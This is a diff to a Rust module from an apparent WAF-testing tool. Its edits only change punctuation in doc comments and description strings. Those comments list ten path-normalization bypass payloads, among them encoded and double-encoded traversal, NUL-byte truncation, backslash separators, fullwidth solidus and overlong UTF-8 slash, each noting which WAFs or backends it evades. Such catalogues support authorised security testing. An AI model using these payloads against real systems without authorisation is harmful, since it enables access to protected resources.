@@ -1,4 +1,4 @@
-//! HTTP request-path parser-differential probes — exploit
+//! HTTP request-path parser-differential probes, exploit
 //! normalization disagreements between a fronting WAF and the backend
 //! origin.
 //!
@@ -24,40 +24,40 @@ use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};
 /// to a known WAF/origin disagreement on URL-path interpretation.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum PathNormalizeTechnique {
-    /// `/safe/%2e%2e/<target>` — URL-encoded dot-dot traversal.
+    /// `/safe/%2e%2e/<target>`: URL-encoded dot-dot traversal.
     /// Bypasses WAFs that scan only for literal `../`.
     DotSegmentEncoded,
-    /// `/safe/%252e%252e/<target>` — double-encoded dot-dot.
+    /// `/safe/%252e%252e/<target>`: double-encoded dot-dot.
     /// Bypasses single-decode WAFs that see literal `%25...`.
     DoubleEncodedDotSegment,
-    /// `/safe/%2e./<target>` — mixed encoded + literal dot.
+    /// `/safe/%2e./<target>`: mixed encoded + literal dot.
     /// Bypasses one-pass normalizers that miss the hybrid form.
     MixedDotEncoding,
-    /// `/safe/..\<target>` — Windows-style backslash separator.
+    /// `/safe/..\<target>`: Windows-style backslash separator.
     /// IIS / some Tomcat treat `\` as a path separator; many WAFs
     /// normalize only forward slashes.
     BackslashTraversal,
-    /// `/<target>%00/safe.html` — NUL-byte truncation.
+    /// `/<target>%00/safe.html`: NUL-byte truncation.
     /// C-string-based filters truncate at NUL; URL-aware backends
     /// keep the full path and route to `/<target>`.
     NullByteTruncation,
-    /// `////<target>` — multi-slash run.
-    /// Some proxies collapse, some don't — a per-segment ACL gate
+    /// `////<target>`: multi-slash run.
+    /// Some proxies collapse, some don't, a per-segment ACL gate
     /// that counts segments by literal slash will undercount.
     MultiSlashCollapse,
-    /// `/safe#/<target>` — fragment-leaked path.
+    /// `/safe#/<target>`: fragment-leaked path.
     /// Backends strip fragment before routing; some WAFs split before
     /// normalization and see only `/safe`.
     FragmentLeak,
-    /// `/<target>;jsessionid=evil` — RFC 3986 path parameter suffix.
+    /// `/<target>;jsessionid=evil`: RFC 3986 path parameter suffix.
     /// Some WAFs normalize the path-param suffix away (matching
     /// `/<target>`) while others keep it and miss the gate.
     SemicolonPathParam,
-    /// `/<U+FF0F><target>` — fullwidth solidus (visually a `/`).
+    /// `/<U+FF0F><target>`: fullwidth solidus (visually a `/`).
     /// Backends that NFKC-normalize the URL see `/admin`; WAFs that
     /// don't see a 3-byte UTF-8 sequence and pass.
     UnicodeFullwidthSlash,
-    /// `/%c0%af<target>` — overlong UTF-8 encoding of `/`.
+    /// `/%c0%af<target>`: overlong UTF-8 encoding of `/`.
     /// Forbidden by RFC 3629 but accepted by lenient parsers
     /// (pre-2.2.x Apache, old IIS, some Tomcat versions).
     OverlongUtf8Slash,
@@ -65,7 +65,7 @@ pub enum PathNormalizeTechnique {
 
 impl PathNormalizeTechnique {
     /// Stable kebab-case technique name. Used in JSON output and
-    /// telemetry — operators key on this for reproducibility.
+    /// telemetry (operators key on this for reproducibility).
     #[must_use]
     pub fn technique_name(&self) -> &'static str {
         match self {
@@ -87,21 +87,21 @@ impl PathNormalizeTechnique {
     pub fn description(&self) -> &'static str {
         match self {
             Self::DotSegmentEncoded => {
-                "URL-encoded dot-dot traversal — bypasses literal `../` scanners"
+                "URL-encoded dot-dot traversal, bypasses literal `../` scanners"
             }
-            Self::DoubleEncodedDotSegment => "Double-encoded dot-dot — bypasses single-decode WAFs",
-            Self::MixedDotEncoding => "Mixed encoded + literal dot — bypasses one-pass normalizers",
+            Self::DoubleEncodedDotSegment => "Double-encoded dot-dot, bypasses single-decode WAFs",
+            Self::MixedDotEncoding => "Mixed encoded + literal dot, bypasses one-pass normalizers",
             Self::BackslashTraversal => {
-                "Windows backslash separator — IIS-style WAF/origin differential"
+                "Windows backslash separator: IIS-style WAF/origin differential"
             }
-            Self::NullByteTruncation => "NUL-byte truncation — splits WAF view from backend view",
-            Self::MultiSlashCollapse => "Multi-slash run — segment-count differential",
-            Self::FragmentLeak => "Fragment-in-path — WAFs that split early see wrong path",
-            Self::SemicolonPathParam => "RFC 3986 path-param suffix — normalizer differential",
+            Self::NullByteTruncation => "NUL-byte truncation, splits WAF view from backend view",
+            Self::MultiSlashCollapse => "Multi-slash run, segment-count differential",
+            Self::FragmentLeak => "Fragment-in-path. WAFs that split early see wrong path",
+            Self::SemicolonPathParam => "RFC 3986 path-param suffix, normalizer differential",
             Self::UnicodeFullwidthSlash => {
-                "U+FF0F fullwidth solidus — visually a slash, byte-wise not"
+                "U+FF0F fullwidth solidus, visually a slash, byte-wise not"
             }
-            Self::OverlongUtf8Slash => "Overlong UTF-8 `/` (%c0%af) — accepted by lenient parsers",
+            Self::OverlongUtf8Slash => "Overlong UTF-8 `/` (%c0%af), accepted by lenient parsers",
         }
     }
 }
@@ -190,7 +190,7 @@ impl SmuggleProbe for PathSmuggleProbe {
 }
 
 /// Every path-normalization smuggle variant against the given
-/// protected path. Returns 10 probes — one per
+/// protected path. Returns 10 probes, one per
 /// [`PathNormalizeTechnique`] variant.
 #[must_use]
 pub fn all_variants(protected_path: &str) -> Vec<PathSmuggleProbe> {
